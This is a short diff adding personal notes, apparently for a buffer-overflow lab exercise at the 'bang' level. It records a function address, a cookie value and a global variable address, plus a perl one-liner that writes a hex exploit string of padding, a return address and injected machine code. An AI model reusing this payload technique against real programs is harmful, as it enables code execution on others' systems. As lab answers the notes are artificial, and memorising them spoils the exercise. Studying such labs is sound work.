@@ -1,0 +1,18 @@
+08048cad bang address
+
+
+0x4a2b4834
+cookie
+
+0x804d100
+address to be replaced with cookie
+
+
+ perl -e 'print "61 "x32, "BB "x4, "CC "x4, "DD "x4, "e8 39 68 55", "c7 05 00 d1 04 08 34 48 2b 4a 68 ad 8c 04 08 c3" ' > hexlevel2_2
+
+
+
+"58 33 68 55 "
+
+
+0x556839e8  address to be replaced with
